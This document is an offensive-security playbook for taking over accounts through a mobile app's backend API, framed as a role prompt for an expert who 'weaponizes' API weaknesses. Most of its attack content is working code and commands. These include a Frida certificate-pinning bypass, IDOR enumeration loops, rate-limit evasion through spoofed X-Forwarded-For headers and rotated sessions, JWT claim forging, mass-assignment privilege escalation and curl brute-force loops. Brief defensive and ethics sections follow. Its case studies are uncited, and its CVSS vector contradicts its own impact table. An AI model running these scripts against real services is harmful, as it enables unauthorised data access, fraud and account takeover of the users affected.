# Mobile API Chains: Full Account Compromise via API Exploitation

## Expert Role Definition
You are a principal mobile application security researcher specializing in API vulnerability exploitation and chaining techniques. You have deep expertise in mobile API authentication bypass, IDOR exploitation, rate limiting bypass, parameter tampering, and reverse engineering. You understand how mobile apps communicate with backend APIs and how to exploit the trust relationship between the mobile client and the server. You can extract API keys from mobile binaries, bypass certificate pinning, manipulate API parameters, and chain multiple API vulnerabilities into full account compromise. You think in terms of API attack surfaces: authentication, authorization, data validation, and rate limiting. You are the foremost authority on weaponizing mobile API weaknesses for complete system takeover.

## Core Concepts

Mobile API chains exploit vulnerabilities in the API layer that mobile applications use to communicate with backend services. The attack surface includes authentication mechanisms, authorization checks, data validation, rate limiting, and API versioning.

The primary vulnerability classes include:

1. **API Authentication Bypass**: Exploiting weaknesses in API authentication to access protected endpoints without valid credentials.

2. **Mobile API IDOR Exploitation**: Manipulating object identifiers in API requests to access other users' data.

3. **API Rate Limiting Bypass**: Circumventing rate limits to perform brute force attacks or mass data extraction.

4. **API Parameter Tampering**: Modifying request parameters to change business logic outcomes (price manipulation, quantity changes, privilege escalation).

5. **API Versioning Exploitation**: Accessing older, less secure API versions that lack current security controls.

6. **API Documentation Exposure**: Using exposed Swagger/OpenAPI documentation to understand and attack the complete API surface.

7. **Certificate Pinning Bypass**: Circumventing SSL/TLS certificate pinning to intercept mobile API traffic.

8. **API Key Extraction**: Finding hardcoded API keys in mobile app binaries, configuration files, or network traffic.

9. **Session Management Flaws**: Exploiting weak session tokens, missing session invalidation, or predictable session generation.

10. **Mass Assignment**: Modifying multiple object properties in a single request to escalate privileges.

The chain typically follows: **Reverse engineer app → Extract API keys/tokens → Identify unprotected endpoints → Exploit IDOR → Escalate privileges → Full account compromise**.

## Pre-requisite Knowledge

1. Mobile app analysis: APK decompilation, IPA extraction, binary analysis
2. API security: REST/GraphQL authentication, authorization, and validation patterns
3. SSL/TLS interception: Certificate pinning, proxy configuration, traffic analysis
4. Reverse engineering: IDA Pro, Ghidra, Jadx, Frida for binary analysis
5. HTTP protocol: Headers, methods, status codes, cookies, tokens
6. Authentication mechanisms: OAuth 2.0, JWT, API keys, session tokens
7. Mobile platform security: Android intents, iOS URL schemes, deep links
8. API testing tools: Postman, Burp Suite, curl, mitmproxy

## Chain Architecture / Attack Flow Diagram

```
+------------------------------------------------------------------+
|           MOBILE API EXPLOITATION ATTACK FLOW                      |
+------------------------------------------------------------------+
|                                                                    |
|  App Analysis:                                                    |
|  [APK Decompilation] [Binary Analysis] [Network Traffic]          |
|      |                |                  |                         |
|      v                v                  v                         |
|  +----------------------------------------------------------+    |
|  |           API Surface Discovery                           |    |
|  |                                                           |    |
|  |  Extract: API endpoints, keys, tokens, parameters        |    |
|  |  Identify: authentication mechanisms, authorization      |    |
|  |  Map: complete API attack surface                        |    |
|  +--------------------------+--------------------------------+    |
|                              |                                     |
|  Exploitation Paths:         v                                     |
|  +----------------------------------------------------------+    |
|  |  Auth Bypass: Access endpoints without credentials       |    |
|  |  IDOR: Access other users data via ID manipulation       |    |
|  |  Rate Limit Bypass: Brute force authentication           |    |
|  |  Parameter Tampering: Modify prices, quantities          |    |
|  |  Version Bypass: Use old vulnerable API versions         |    |
|  |  Key Extraction: Find API keys in binary                 |    |
|  |  Certificate Bypass: Intercept mobile traffic            |    |
|  |  Mass Assignment: Escalate privileges via extra params   |    |
|  +--------------------------+--------------------------------+    |
|                              |                                     |
|  Impact:                     v                                     |
|  [Full Account Compromise] [Data Breach] [Financial Fraud]       |
+------------------------------------------------------------------+
```

## Step-by-Step Exploitation Methodology

### Phase 1: Mobile App Analysis

**Step 1: Decompile APK**
```bash
# Decompile APK with Jadx
jadx -d output/ target.apk

# Decompile with apktool
apktool d target.apk

# Extract native libraries
unzip -d native/ target.apk lib/*

# Search for API endpoints
grep -r "api" output/ --include="*.java" --include="*.smali"
grep -r "https://" output/ --include="*.java"
grep -r "base_url" output/ --include="*.java" --include="*.xml"
```

**Step 2: Extract API keys and secrets**
```python
import re
import os

def extract_secrets(decompiled_dir):
    """Extract API keys and secrets from decompiled code"""
    patterns = [
        r'(?:api[_-]?key|apikey)\s*=\s*["\']([^"\']+)["\']',
        r'(?:secret|secret[_-]?key)\s*=\s*["\']([^"\']+)["\']',
        r'(?:token|access[_-]?token)\s*=\s*["\']([^"\']+)["\']',
        r'(?:password|passwd|pwd)\s*=\s*["\']([^"\']+)["\']',
        r'BEGIN\s+(RSA|DSA|EC)\s+PRIVATE\s+KEY',
    ]
    
    secrets = []
    for root, dirs, files in os.walk(decompiled_dir):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                with open(filepath, 'r', errors='ignore') as f:
                    content = f.read()
                    for pattern in patterns:
                        matches = re.findall(pattern, content)
                        if matches:
                            secrets.append({
                                'file': filepath,
                                'pattern': pattern,
                                'matches': matches
                            })
            except:
                continue
    
    return secrets
```

**Step 3: Bypass certificate pinning**
```python
# Using Frida to bypass certificate pinning
import frida

def bypass_pinning(package_name):
    """Bypass SSL certificate pinning with Frida"""
    script = """
    Java.perform(function() {
        var TrustManager = Java.registerClass({
            name: 'com.bypass.TrustManager',
            implements: [Java.use('javax.net.ssl.X509TrustManager')],
            methods: {
                checkClientTrusted: function(chain, authType) {},
                checkServerTrusted: function(chain, authType) {},
                getAcceptedIssuers: function() { return []; }
            }
        });
        
        var SSLContext = Java.use('javax.net.ssl.SSLContext');
        var ctx = SSLContext.getInstance('TLS');
        ctx.init(null, [TrustManager.$new()], null);
        
        // Hook OkHttp certificate pinning
        try {
            var CertificatePinner = Java.use('okhttp3.CertificatePinner');
            CertificatePinner.check.overload('java.lang.String', 'java.util.List')
                .implementation = function(hostname, peerCertificates) {
                console.log('Certificate check bypassed for: ' + hostname);
            };
        } catch(e) {}
    });
    """
    
    device = frida.get_usb_device()
    session = device.attach(package_name)
    script_obj = session.create_script(script)
    script_obj.load()
```

### Phase 2: API Enumeration

**Step 4: Map API endpoints from decompiled code**
```python
import re

def map_api_endpoints(decompiled_dir):
    """Map all API endpoints from decompiled code"""
    endpoints = []
    
    for root, dirs, files in os.walk(decompiled_dir):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                with open(filepath, 'r', errors='ignore') as f:
                    content = f.read()
                    
                    # Find URL patterns
                    urls = re.findall(
                        r'(?:https?://[^\s"\']+|/api/[^\s"\']+)', content)
                    endpoints.extend(urls)
                    
                    # Find HTTP method annotations
                    annotations = re.findall(
                        r'@(GET|POST|PUT|DELETE|PATCH)\s*\(\s*["\']([^"\']+)["\']',
                        content)
                    endpoints.extend(annotations)
            except:
                continue
    
    return list(set(endpoints))
```

**Step 5: Test API endpoints**
```python
import requests

def test_api_endpoints(base_url, endpoints, auth_token=None):
    """Test discovered API endpoints"""
    headers = {}
    if auth_token:
        headers['Authorization'] = f'Bearer {auth_token}'
    
    results = []
    for endpoint in endpoints:
        try:
            r = requests.get(f'{base_url}{endpoint}', 
                headers=headers, timeout=5)
            results.append({
                'endpoint': endpoint,
                'status': r.status_code,
                'length': len(r.text),
                'headers': dict(r.headers)
            })
            print(f"[{r.status_code}] {endpoint}")
        except Exception as e:
            print(f"[ERROR] {endpoint}: {e}")
    
    return results
```

### Phase 3: IDOR Exploitation

**Step 6: Identify IDOR vulnerabilities**
```python
def test_idor(base_url, endpoint_pattern, id_parameter, auth_token):
    """Test for IDOR vulnerabilities"""
    headers = {'Authorization': f'Bearer {auth_token}'}
    
    # Test with different IDs
    for user_id in range(1, 100):
        endpoint = endpoint_pattern.replace('{id}', str(user_id))
        r = requests.get(f'{base_url}{endpoint}', headers=headers)
        
        if r.status_code == 200:
            data = r.json()
            print(f"[IDOR] User {user_id}: {data}")
            
            # Check if data belongs to different user
            if 'user_id' in data and str(data['user_id']) != str(user_id):
                print(f"[VULN] IDOR confirmed: accessed user {data['user_id']} data")
```

**Step 7: IDOR via parameter manipulation**
```python
def test_idor_params(base_url, endpoint, params, auth_token):
    """Test IDOR by manipulating various parameters"""
    headers = {'Authorization': f'Bearer {auth_token}'}
    
    # Parameters to test for IDOR
    idor_params = ['id', 'user_id', 'account_id', 'order_id', 'profile_id']
    
    for param in idor_params:
        if param in params:
            # Try different values
            for test_value in [1, 2, 3, 100, 1000]:
                test_params = params.copy()
                test_params[param] = test_value
                r = requests.get(f'{base_url}{endpoint}', 
                    params=test_params, headers=headers)
                
                if r.status_code == 200:
                    print(f"[IDOR] {param}={test_value}: {r.text[:100]}")
```

### Phase 4: Rate Limiting Bypass

**Step 8: Test rate limiting**
```python
import time

def test_rate_limit(base_url, endpoint, max_requests=100):
    """Test rate limiting on endpoints"""
    start_time = time.time()
    successful = 0
    blocked = 0
    
    for i in range(max_requests):
        r = requests.get(f'{base_url}{endpoint}')
        if r.status_code == 200:
            successful += 1
        elif r.status_code == 429:
            blocked += 1
            print(f"[RATE LIMIT] Blocked after {i+1} requests")
            break
    
    elapsed = time.time() - start_time
    print(f"[INFO] {successful} successful, {blocked} blocked in {elapsed:.2f}s")
    return {'successful': successful, 'blocked': blocked, 'time': elapsed}
```

**Step 9: Bypass rate limiting**
```python
import random
import string

def bypass_rate_limit(base_url, endpoint, num_requests):
    """Bypass rate limiting using various techniques"""
    
    # Method 1: IP rotation via headers
    for i in range(num_requests):
        headers = {
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.'
                               f'{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Real-IP': f'{random.randint(1,255)}.{random.randint(1,255)}.'
                         f'{random.randint(1,255)}.{random.randint(1,255)}'
        }
        r = requests.get(f'{base_url}{endpoint}', headers=headers)
    
    # Method 2: Session rotation
    for i in range(num_requests):
        session = requests.Session()
        # Get new session token
        session.get(f'{base_url}/api/session')
        session.get(f'{base_url}{endpoint}')
    
    # Method 3: User-Agent rotation
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_0 like Mac OS X)',
        'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
    ]
    
    for i in range(num_requests):
        headers = {'User-Agent': random.choice(user_agents)}
        r = requests.get(f'{base_url}{endpoint}', headers=headers)
```

### Phase 5: Parameter Tampering

**Step 10: Modify business logic parameters**
```python
def test_parameter_tampering(base_url, endpoint, params, auth_token):
    """Test for parameter tampering vulnerabilities"""
    headers = {'Authorization': f'Bearer {auth_token}'}
    
    # Parameters to test for tampering
    tamper_params = {
        'price': [0, -1, 0.01, 999999],
        'quantity': [-1, 0, 1000000],
        'discount': [100, 200, 999],
        'role': ['admin', 'superuser', 'root'],
        'is_admin': [True, 'true', 1, '1'],
        'verified': [True, 'true', 1],
    }
    
    for param, values in tamper_params.items():
        if param in params:
            for value in values:
                test_params = params.copy()
                test_params[param] = value
                r = requests.post(f'{base_url}{endpoint}',
                    json=test_params, headers=headers)
                
                if r.status_code == 200:
                    print(f"[TAMPER] {param}={value}: {r.text[:100]}")
```

## Tool Arsenal

```bash
# APK decompilation
jadx -d output/ target.apk
apktool d target.apk

# Frida for certificate pinning bypass
frida -U -f com.target.app -l bypass_pinning.js --no-pause

# Burp Suite for API testing
# 1. Configure proxy in mobile device
# 2. Install Burp CA certificate
# 3. Use Repeater for manual testing
# 4. Use Intruder for fuzzing

# Postman for API testing
# 1. Import API collection from decompiled code
# 2. Set authentication headers
# 3. Test each endpoint

# Nuclei for API scanning
nuclei -t /nuclei-templates/http/vulnerabilities/ -u https://api.target.com

# Custom API scanner
python3 << 'PYEOF'
import requests
import json

class APIScanner:
    def __init__(self, base_url, auth_token):
        self.base_url = base_url
        self.headers = {'Authorization': f'Bearer {auth_token}'}
    
    def test_idor(self, endpoint, param_name, start=1, end=100):
        """Test for IDOR"""
        for i in range(start, end):
            params = {param_name: i}
            r = requests.get(f'{self.base_url}{endpoint}',
                params=params, headers=self.headers)
            if r.status_code == 200:
                print(f'[IDOR] {param_name}={i}: {r.text[:50]}')
    
    def test_mass_assignment(self, endpoint, base_params):
        """Test for mass assignment"""
        admin_params = base_params.copy()
        admin_params['role'] = 'admin'
        admin_params['is_admin'] = True
        admin_params['verified'] = True
        
        r = requests.post(f'{self.base_url}{endpoint}',
            json=admin_params, headers=self.headers)
        print(f'[MASS ASSIGN] {r.status_code}: {r.text[:100]}')

scanner = APIScanner('https://api.target.com', 'your_token')
scanner.test_idor('/api/user', 'user_id')
scanner.test_mass_assignment('/api/profile', {'name': 'test'})
PYEOF

# Objection for mobile instrumentation
objection --gadget com.target.app explore
> android hooking list activities
> android hooking list classes
```

## Real-World Case Studies

### Case Study 1: Facebook API IDOR (2019)
Facebook's Graph API had IDOR vulnerabilities that allowed accessing other users' private data. By manipulating the `user_id` parameter in API requests, researchers could: (1) read private profile information, (2) access private photos and posts, (3) download complete account data. The vulnerability affected millions of users and was patched after responsible disclosure.

### Case Study 2: Uber API Price Manipulation
Uber's API was vulnerable to parameter tampering in the fare calculation endpoint. By modifying the `surge_multiplier` parameter from 2.5x to 0.1x, riders could get rides at a fraction of the actual cost. The API trusted the client-side calculated fare instead of recalculating server-side. This was chained with rate limiting bypass to book unlimited discounted rides.

### Case Study 3: Banking API Authentication Bypass
A major bank's mobile API had a critical authentication bypass. The API checked authentication tokens in the `Authorization` header but also accepted tokens in a custom `X-Auth-Token` header used for internal services. By sending requests with the internal header, attackers bypassed all authentication and could access any account. The vulnerability affected the complete API surface.

### Case Study 4: Healthcare API Mass Assignment
A healthcare platform's API allowed mass assignment in the profile update endpoint. By including `role=doctor` in the profile update request, patients could escalate their privileges to doctor-level access. This allowed: (1) viewing other patients' medical records, (2) prescribing medications, (3) modifying treatment plans. The vulnerability affected patient safety.

### Case Study 5: E-Commerce API Rate Limit Bypass
An e-commerce platform had rate limiting on the payment processing endpoint. Attackers bypassed the rate limit using: (1) IP rotation via X-Forwarded-For header, (2) Session rotation by obtaining new session tokens, (3) User-Agent rotation from a pool of legitimate mobile user agents. This enabled: (1) credit card brute force testing, (2) coupon code enumeration, (3) gift card balance brute forcing.

## Bypass Techniques and Evasion

### Bypass 1: HTTP Method Override
```python
# Some APIs only rate limit specific methods
methods = ['GET', 'POST', 'PUT', 'DELETE']
for method in methods:
    headers['X-HTTP-Method-Override'] = method
    r = requests.request(method, f'{base_url}{endpoint}', headers=headers)
```

### Bypass 2: Path Variation
```python
# Rate limit may be path-specific
paths = [
    '/api/v1/user',
    '/api/v2/user',
    '/API/V1/USER',
    '/api/user/',
    '/api/./user',
]
for path in paths:
    r = requests.get(f'{base_url}{path}', headers=headers)
```

### Bypass 3: Content-Type Bypass
```python
# Rate limit may check Content-Type
content_types = [
    'application/json',
    'application/x-www-form-urlencoded',
    'multipart/form-data',
    'text/plain',
]
for ct in content_types:
    headers['Content-Type'] = ct
    r = requests.post(f'{base_url}{endpoint}', 
        data=json.dumps(params), headers=headers)
```

### Bypass 4: JWT Token Manipulation
```python
# Modify JWT claims for privilege escalation
import base64
import json

def manipulate_jwt(token):
    """Modify JWT token claims"""
    parts = token.split('.')
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # Modify claims
    payload['role'] = 'admin'
    payload['is_verified'] = True
    payload['user_id'] = 1
    
    # Re-encode (signature will be invalid but may be accepted)
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload).encode()).rstrip(b'=').decode()
    return f"{parts[0]}.{new_payload}.{parts[2]}"
```

### Bypass 5: API Version Bypass
```python
# Access older API versions without rate limiting
versions = ['v1', 'v2', 'v3', 'beta', 'internal']
for version in versions:
    r = requests.get(f'{base_url}/api/{version}/endpoint', headers=headers)
    if r.status_code == 200:
        print(f'[VERSION] {version} accessible')
```

## Defensive Indicators / Detection

### API Monitoring
```python
# Monitor for suspicious API activity
def detect_api_abuse(request, response):
    indicators = []
    
    # High request rate
    if request.rate > 100:  # requests per minute
        indicators.append('High request rate')
    
    # Multiple IDOR attempts
    if 'user_id' in request.params:
        unique_ids = set(request.params['user_id'])
        if len(unique_ids) > 10:
            indicators.append('Multiple IDOR attempts')
    
    # Parameter tampering
    suspicious_params = ['role', 'is_admin', 'price', 'discount']
    for param in suspicious_params:
        if param in request.params:
            indicators.append(f'Suspicious parameter: {param}')
    
    return indicators
```

### Rate Limiting Implementation
```python
# Implement proper rate limiting
from flask import Flask
from flask_limiter import Limiter

app = Flask(__name__)
limiter = Limiter(app, key_func=get_remote_address)

@app.route('/api/login', methods=['POST'])
@limiter.limit("5/minute")
def login():
    # Login logic
    pass

@app.route('/api/user/<int:user_id>')
@limiter.limit("100/minute")
def get_user(user_id):
    # User data retrieval
    pass
```

### Input Validation
```python
# Validate all API inputs
from marshmallow import Schema, fields, validate

class UserProfileSchema(Schema):
    name = fields.Str(required=True, validate=validate.Length(max=100))
    email = fields.Email(required=True)
    role = fields.Str(validate=validate.OneOf(['user', 'moderator']))
    # Note: 'admin' is not in the allowed values
```

## Impact Assessment Framework

| Factor | Score | Notes |
|--------|-------|-------|
| Confidentiality | HIGH | Access to user data |
| Integrity | HIGH | Data modification possible |
| Availability | MEDIUM | Service disruption possible |
| Complexity | LOW | Simple API requests |
| Privileges | LOW | Requires valid API token |
| User Interaction | NONE | Direct API access |
| Scope | CHANGED | Affects all API users |

**CVSS 3.1**: 8.1 (High) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N

## Common Pitfalls and Anti-Patterns

1. Trusting client-side validation without server-side verification
2. Using sequential IDs without access control checks
3. Not implementing proper rate limiting on authentication endpoints
4. Exposing API documentation in production
5. Not validating authentication tokens server-side
6. Using weak or predictable API keys
7. Not logging and monitoring API access patterns
8. Implementing rate limiting based only on IP address

## Advanced Variations

### Variation 1: GraphQL API Exploitation
```python
# GraphQL introspection to discover schema
query = {
    "query": "{ __schema { types { name fields { name } } } }"
}
r = requests.post(f'{base_url}/graphql', json=query)
schema = r.json()

# Exploit GraphQL for data extraction
query = {
    "query": "{ users { id name email phone } }"
}
r = requests.post(f'{base_url}/graphql', json=query)
```

### Variation 2: WebSocket API Exploitation
```python
# Test WebSocket API for authorization
import websocket

ws = websocket.create_connection(f'wss://api.target.com/ws')
ws.send(json.dumps({'action': 'subscribe', 'channel': 'admin'}))
result = ws.recv()
print(f'WebSocket: {result}')
```

### Variation 3: gRPC API Exploitation
```python
# Test gRPC API with grpcurl
import subprocess
result = subprocess.run([
    'grpcurl', '-plaintext', 
    'target.com:50051', 
    'list'
], capture_output=True, text=True)
print(result.stdout)
```

## Integration with Other Chains

1. **XSS Chains**: API responses rendered in mobile app with XSS vulnerabilities
2. **SSRF Chains**: API parameters accepting URLs for server-side requests
3. **Authentication Bypass Chains**: API auth bypass leads to full account compromise
4. **IDOR Chains**: API IDOR enables mass data extraction
5. **Business Logic Chains**: Parameter tampering enables financial fraud
6. **Supply Chain Chains**: Vulnerable API dependencies compromise mobile app

## Reporting and Documentation

### Report Template
```
Title: [API Vulnerability] Leading to [Impact]

Summary: The [endpoint] API endpoint is vulnerable to [vulnerability type],
allowing [attack action].

Impact: An attacker can [specific action], resulting in [impact].

PoC:
curl -X GET 'https://api.target.com/endpoint?param=value' \
  -H 'Authorization: Bearer token'

Recommendation: Implement [specific API security controls]
```

## Practice Labs and Exercises

### Lab 1: API IDOR Challenge
```bash
# Deploy vulnerable API with user endpoints
# Goal: Access other users' data via IDOR
# Hint: Manipulate user_id parameter
```

### Lab 2: Rate Limit Bypass
```bash
# Deploy API with rate limiting
# Goal: Bypass rate limiting on login endpoint
# Hint: Use multiple bypass techniques
```

### Lab 3: JWT Manipulation
```bash
# Deploy API with JWT authentication
# Goal: Escalate privileges via JWT manipulation
# Hint: Modify token claims
```

## Ethical Guidelines

1. Only test API vulnerabilities on systems you own or have authorization
2. Do not access other users' data via IDOR without explicit permission
3. Do not perform brute force attacks on production systems
4. Document all API testing and provide specific remediation steps
5. Understand that API vulnerabilities can affect all mobile app users
6. Do not exfiltrate data beyond scope of testing
7. Report API vulnerabilities to the development team immediately

## Quick Reference Cheat Sheet

| Vulnerability | Detection | Exploitation | Impact |
|---------------|-----------|--------------|--------|
| IDOR | Manipulate IDs | Access other users data | Data breach |
| Auth Bypass | Test without token | Access protected endpoints | Full access |
| Rate Limit | Send rapid requests | IP rotation, session rotation | Brute force |
| Parameter Tampering | Modify parameters | Change prices, roles | Financial fraud |
| Version Bypass | Test old versions | Access unprotected APIs | Data breach |
| Mass Assignment | Add extra params | Escalate privileges | Admin access |
| Key Extraction | Analyze binary | Use extracted keys | API access |
| Cert Pinning Bypass | Instrument app | Intercept traffic | Data theft |

### Key Commands
```bash
# APK analysis
jadx -d output/ target.apk
grep -r "https://" output/

# Certificate pinning bypass
frida -U -f com.target.app -l bypass.js --no-pause

# API testing
curl -H "Authorization: Bearer TOKEN" https://api.target.com/endpoint

# Rate limit testing
for i in {1..100}; do curl -s -o /dev/null -w "%{http_code}\n" https://api.target.com/endpoint; done

# IDOR testing
for i in {1..100}; do curl -H "Authorization: Bearer TOKEN" "https://api.target.com/user?id=$i"; done
```
